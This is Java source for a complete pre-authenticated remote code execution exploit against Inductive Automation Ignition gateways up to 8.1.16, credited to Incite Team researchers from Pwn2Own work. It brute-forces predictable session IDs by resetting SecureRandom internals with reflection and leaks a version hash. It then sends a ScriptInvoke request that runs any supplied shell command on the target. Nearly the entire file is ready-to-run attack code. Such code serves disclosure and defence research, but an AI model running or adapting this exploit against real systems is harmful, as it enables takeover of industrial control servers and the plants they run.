package com.srcincite.ia.exploit;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.io.StringReader;
import java.lang.reflect.Field;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.security.MessageDigest;
import java.security.SecureRandom;
import java.security.SecureRandomSpi;
import java.util.ArrayList;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import java.util.Collections;  
import  java.util.Base64;
import org.apache.commons.cli.CommandLine;
import org.apache.commons.cli.CommandLineParser;
import org.apache.commons.cli.DefaultParser;
import org.apache.commons.cli.HelpFormatter;
import org.apache.commons.cli.Option;
import org.apache.commons.cli.Options;
import org.apache.commons.cli.ParseException;
import org.python.core.PyObject;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.xml.sax.InputSource;

/*
# Randy

## What

This is a pre-authenticated RCE exploit for Inductive Automation Ignition that impacts versions <= 8.1.16. 
We failed to exploit the bugs at Pwn2Own Miami 2022 because we had a sloppy exploit and no debug environment, 
but since then we have found the time and energy to improve it!

## Authors

Chris Anastasio and Steven Seeley (mr_me) of Incite Team
*/

public class Poc
{
    private static final char[] ENTROPY = "inductiveautomation".toCharArray();
    public SecureRandom random = new SecureRandom();
    public MessageDigest digest;
    public String rhost;
    public int rport;
    public String cmd;
    public String delay;
    public long ver;
    protected int sessionIdLength = 16;
    byte[] nonce = new byte[16];
    static int[] CRC32_TABLE = new int[256];
    static{
        for (int n = 0; n < 256; n++){
            int c = n;
            for (int k = 8; --k >= 0; ){
                if ((c & 1) != 0)
                    c = 0xEDB88320 ^ (c >>> 1);
                else
                    c = c >>> 1;
            }
            CRC32_TABLE[n] = c;
        }
    }

    public Poc(String[] args){
        CommandLine cmdline = setUpArgs(args);
        rhost = cmdline.getOptionValue("target");
        if (rhost.contains(":")){
            rhost = rhost.split(":")[0];
            rport = Integer.parseInt(rhost.split(":")[1]);
        }else{
            rport = 8088;
        }
        cmd = cmdline.getOptionValue("cmd");
        delay = cmdline.getOptionValue("delay", "1");
    }

    public void setNonce(byte val){
        this.nonce[15] = val;
    }
    
    private void setVer(long ver){
        this.ver = ver;
    }

    public static CommandLine setUpArgs(String[] args){
        Options options = new Options();
        Option target = new Option("t", "target", true, "The target ip and port <ip:port>");
        target.setRequired(true);
        options.addOption(target);
        Option cmd2run = new Option("c", "cmd", true, "The command to run");
        cmd2run.setRequired(true);
        options.addOption(cmd2run);
        Option timeout = new Option("d", "delay", true, "The bruteforce delay timeout [default is 1 second]");
        timeout.setRequired(false);
        options.addOption(timeout);
        CommandLineParser parser = new DefaultParser();
        HelpFormatter formatter = new HelpFormatter();
        CommandLine cmd = null;
        try{
            cmd = parser.parse(options, args);
        }catch (ParseException e){
            System.out.println(e.getMessage());
            formatter.printHelp(Poc.class.getSimpleName(), options);
            System.exit(1);
        }
        return cmd;
    }

    public void initRandom(long seed) throws Exception{
        // restore nonce and other values
        reset();
        char[] entropy = ENTROPY;
        for (int i = 0; i < entropy.length; i++){
            long update = ((byte)entropy[i] << i % 8 * 8);
            seed ^= update;
        } 
        this.random.setSeed(seed);   
        this.digest = MessageDigest.getInstance("SHA-1");
    }

    public String generateSessionId() throws NoSuchFieldException, SecurityException, IllegalArgumentException, IllegalAccessException{
        byte[] random = new byte[16];
        StringBuffer buffer = new StringBuffer();
        int resultLenBytes = 0;
        while (resultLenBytes < this.sessionIdLength){
            this.random.nextBytes(random);
            random = this.digest.digest(random);
            for (int j = 0; j < random.length && resultLenBytes < this.sessionIdLength; j++){
                byte b1 = (byte)((random[j] & 0xF0) >> 4);
                byte b2 = (byte)(random[j] & 0xF);
                if (b1 < 10){
                    buffer.append((char)(48 + b1));
                } else{
                    buffer.append((char)(65 + b1 - 10));
                }
                if (b2 < 10){
                    buffer.append((char)(48 + b2));
                }else{
                    buffer.append((char)(65 + b2 - 10));
                }
                resultLenBytes++;
            }
        }
        return buffer.toString();
    }

    public void reset() throws NoSuchFieldException, SecurityException, IllegalArgumentException, IllegalAccessException{
        // get the secureRandomSpi field value
        Field field = this.random.getClass().getDeclaredField("secureRandomSpi");    
        field.setAccessible(true);
        SecureRandomSpi spi = (SecureRandomSpi)field.get(this.random);
        // get the impl field value
        field = spi.getClass().getDeclaredField("impl");    
        field.setAccessible(true);
        Object hd = field.get(spi);
        // allow access to the c Field
        field = hd.getClass().getDeclaredField("c");    
        field.setAccessible(true);
        field.set(hd, null);
        // allow access to the v Field
        field = hd.getClass().getDeclaredField("v");    
        field.setAccessible(true);
        field.set(hd, null);
        // set the digest field to null
        field = hd.getClass().getDeclaredField("digest");    
        field.setAccessible(true);
        field.set(hd, null);
        // set the requestedNonce field to the nouce to reset SecureRandom
        Field field3 = hd.getClass().getSuperclass().getSuperclass().getDeclaredField("requestedNonce");
        field3.setAccessible(true);
        field3.set(hd, nonce);
        // set the instantiated field to false and reseedCounter field to 0
        Field[] fld = hd.getClass().getSuperclass().getSuperclass().getDeclaredFields();
        for(int i = 0; i < fld.length; i++){
            fld[i].setAccessible(true);
            if (fld[i].getName().equals("instantiated")){
                fld[i].setBoolean(hd, false);
            }
            else if (fld[i].getName().equals("reseedCounter")){
                fld[i].setInt(hd, 0);
            }
        }
    }

    public boolean checkSessionId(String sessionid) throws Exception{
        String xml = String.format("<requestwrapper>\r\n"
                + "  <version>1337</version>\r\n" 
                + "  <scope>2</scope>\r\n"
                + "  <message>\r\n"
                + "    <messagetype>199</messagetype>\r\n"
                + "    <messagebody>\r\n"
                + "      <arg name=\"funcId\"><![CDATA[GetSessionInfo]]></arg>\r\n"
                + "      <arg name=\"subFunction\"><![CDATA[currentSession]]></arg>\r\n"
                + "    </messagebody>\r\n"
                + "  </message>\r\n"
                + "  <cookie>%s</cookie>\r\n"
                + "</requestwrapper>", sessionid);
        String url = String.format("http://%s:%d/system/gateway", rhost, rport);
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("POST");
        con.setRequestProperty("Content-Type", "text/xml");
        con.setDoOutput(true);
        OutputStream os = con.getOutputStream();
        os.write(xml.getBytes("utf-8"));
        os.close();
        try{
            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
            DocumentBuilder builder = factory.newDocumentBuilder();
            Document document = (Document) builder.parse(new InputSource(new StringReader(getResponse(con))));
            Element root = (Element) document.getDocumentElement();
            String code = root.getChildNodes().item(0).getChildNodes().item(0).getTextContent();
            // invalid version but correct sessionId
            return code.equals("309");
        }catch(Exception e){
            System.out.println(e.getMessage());
        }
        return false;
    }

    public void triggerRce(String sessionid, String arg0, String arg1) throws Exception{
        String xml = String.format("<requestwrapper>\r\n"
                + "  <version>%d</version>\r\n"
                + "  <scope>2</scope>\r\n"
                + "  <message>\r\n"
                + "    <messagetype>199</messagetype>\r\n"
                + "    <messagebody>\r\n"
                + "      <arg name=\"funcId\">ScriptInvoke</arg>\r\n"
                + "      <arg name=\"subFunction\">execute</arg>\r\n"
                + "      <arg name=\"function\">si</arg>\r\n"
                + "      <arg name=\"arg\" index=\"0\">%s</arg>\r\n"
                + "      <arg name=\"arg\" index=\"1\">%s</arg>\r\n"
                + "    </messagebody>\r\n"
                + "  </message>\r\n"
                + "  <cookie>%s</cookie>\r\n"
                + "  <locale>\r\n"
                + "    <l>en</l>\r\n"
                + "    <c>US</c>\r\n"
                + "    <v/>\r\n"
                + "  </locale>\r\n"
                + "</requestwrapper>", ver, arg0, arg1, sessionid);
        String url = String.format("http://%s:%d/system/gateway", rhost, rport);
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("POST");
        con.setConnectTimeout(1000);
        con.setRequestProperty("Content-Type", "text/xml");
        con.setDoOutput(true);
        OutputStream os = con.getOutputStream();
        os.write(xml.getBytes("utf-8"));
        os.close();
        con.getInputStream();
    }

    public static void disableWarning(){
        System.err.close();
        System.setErr(System.out);
    }

    public static String getResponse(HttpURLConnection http) throws Exception{
        StringBuilder response;
        try (BufferedReader in = new BufferedReader(
            new InputStreamReader(http.getInputStream()))){
            response = new StringBuilder();
            String line;
            while ((line = in.readLine()) != null){
                response.append(line);
            }
        }
        return response.toString();
    }

    public ArrayList<String> getModules() throws Exception{
        URL url = new URL(String.format("http://%s:%d/system/launchmf/d", rhost, rport));
        URLConnection con = url.openConnection();
        HttpURLConnection http = (HttpURLConnection)con;
        http.setRequestMethod("GET");
        http.setDoOutput(true);
        String res = getResponse(http);
        ArrayList<String> allMatches = new ArrayList<String>();
        Matcher m = Pattern.compile("module name=\"(\\S*)\" build=\"(\\d+)\"").matcher(res);
        String build = "";
        while (m.find()){
            build = m.group(2);
            allMatches.add(m.group(1));
        }
        allMatches.remove(0);
        allMatches.add(0, build);
        return allMatches;
    }

    public long updateInt32(int num, long crc3) throws Exception{
        byte test;
        for (int i=0; i<4; i++){
            test = (byte)((num >> (8*i)) & 0xff);
            if (crc3 != 0){
                crc3 = crc32(new byte[]{ test }, String.valueOf(crc3));
            }else{
                crc3 = crc32(new byte[]{ test }, null);
            }
        }
        return crc3;
    }

    public static long crc32(byte[] bytes, String value) throws Exception{
        int val = 0;
        if(value != null){
            try{
                val = Integer.parseUnsignedInt(value);
            }catch (NumberFormatException e){
                throw new Exception(value+" must be an integer (0x0 and 0xFFFF_FFFF)!");
            }
        }
        int result = ~val;
        for (byte aByte : bytes){
            result = (result >>> 8) ^ CRC32_TABLE[(result ^ aByte) & 0xff];
        }
        result ^= 0xffffffff;
        return Integer.toUnsignedLong(result);
    }

    public void leakVersionHashReal() throws Exception{
        ArrayList<String> modules = getModules();
        String releaseDate = modules.remove(0);
        long crc = updateInt32(2, 0);
        crc = updateInt32(Integer.parseInt(releaseDate), crc);
        Collections.sort(modules);
        for (String moduleName : modules){
            if (moduleName != ""){
                crc = updateInt32(moduleName.hashCode(), crc);
                crc = updateInt32(Integer.parseInt(releaseDate), crc);
            }
        }
        setVer(crc & 0xffffffff);
    }

    public long generateSeed() throws Exception{
        URLConnection connection = new URL(
            String.format("http://%s:%d/system/scriptModules", rhost, rport)
        ).openConnection();
        ZipInputStream zis = new ZipInputStream(connection.getInputStream());
        ZipEntry entry = zis.getNextEntry();
        long seed = entry.getLastModifiedTime().toMillis()-(Long.parseUnsignedLong(delay)*1000);
        return seed;
    }

    public byte[] objToByteArray(Object o) throws IOException {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(o);
        oos.flush();
        return bos.toByteArray();
    }

    public static void main(String[] args ) throws Exception{
        String banner = " ____    __    _  _  ____  _  _\r\n"
                + "(  _ \\  /__\\  ( \\( )(  _ \\( \\/ )\r\n"
                + " )   / /(__)\\  )  (  )(_) )\\  /\r\n"
                + "(_)\\_)(__)(__)(_)\\_)(____/ (__)\r\n"
                + "\r\nA Inductive Automation Ignition <= 8.1.16 RCE Exploit\n"
                + "By Chris Anastasio & Steven Seeley (mr_me) of Incite Team\r\n";
        System.out.println(banner);
        Poc p = new Poc(args);
        System.out.println(String.format("(+) targeting: %s:%d w/ timeout: %ss", p.rhost, p.rport, p.delay));
        // runtime reflection warnings are ugly
        disableWarning();
        long seed = p.generateSeed();
        System.out.println(String.format("(+) starting seed: %s", seed));
        // Many thanks to Sharon Brizinov of Claroty for sharing his get_version_hash_real with us! 
        p.leakVersionHashReal();
        System.out.println(String.format("(+) leaked version: %s", p.ver));
        String s;
        for (long l = seed; l < seed+10000L; l++){
            for (int i = 0; i < 20; i++){
                p.setNonce((byte) i);
                p.initRandom(l);
                s = p.generateSessionId();
                if (p.checkSessionId(s)){
                    System.out.println(String.format("(+) found seed %d w/ session %s", l, s));
                    System.out.println(String.format("(+) triggering cmd %s", p.cmd));
                    byte [] arg0 = Base64.getEncoder().encode(p.objToByteArray(String.format("__import__('os').system('%s');", p.cmd)));
                    byte [] arg1 = Base64.getEncoder().encode(p.objToByteArray(new PyObject()));
                    p.triggerRce(s,  new String(arg0), new String(arg1));
                }
            }
        }
    }
}
